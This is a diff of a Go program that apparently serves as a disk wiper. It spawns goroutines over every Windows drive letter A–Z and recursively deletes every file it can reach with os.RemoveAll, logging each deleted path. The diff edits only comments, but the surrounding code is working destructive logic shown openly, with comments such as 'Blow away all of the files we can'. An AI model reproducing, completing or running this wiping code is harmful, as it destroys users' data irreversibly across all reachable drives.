@@ -23,9 +23,10 @@ func main() {
 	/* Print files to stdout */
 	log.SetOutput(os.Stdout)
 
+	/* Blow away all of the files we can */
 	var wg sync.WaitGroup
-	/* If we're using Windows, blow away files from all drives. */
 	if "windows" == runtime.GOOS {
+		/* If we're using Windows, blow away files from all drives. */
 		for d := 'A'; d <= 'Z'; d++ {
 			wg.Add(1)
 			go wipe(fmt.Sprintf(`%c:\`, d), &wg)
@@ -44,6 +45,8 @@ func main() {
 /* wipe removes everything under path */
 func wipe(path string, wg *sync.WaitGroup) {
 	defer wg.Done()
+	/* Walk the file tree starting at path and remove every regular
+	file. */
 	if err := filepath.Walk(
 		path,
 		func(path string, info os.FileInfo, err error) error {
@@ -53,13 +56,15 @@ func wipe(path string, wg *sync.WaitGroup) {
 				return nil
 			}
 			/* Try to remove the file and print the path if we
-			succeed */
+			succeed. */
 			if nil == os.RemoveAll(path) {
 				log.Printf("%v", path)
 			}
 			return nil
 		},
 	); nil != err {
+		/* This will probably only happen on Windows for the 20-odd
+		drives which won't likely exist. */
 		log.Printf("%v: %v", path, err)
 	}
 }
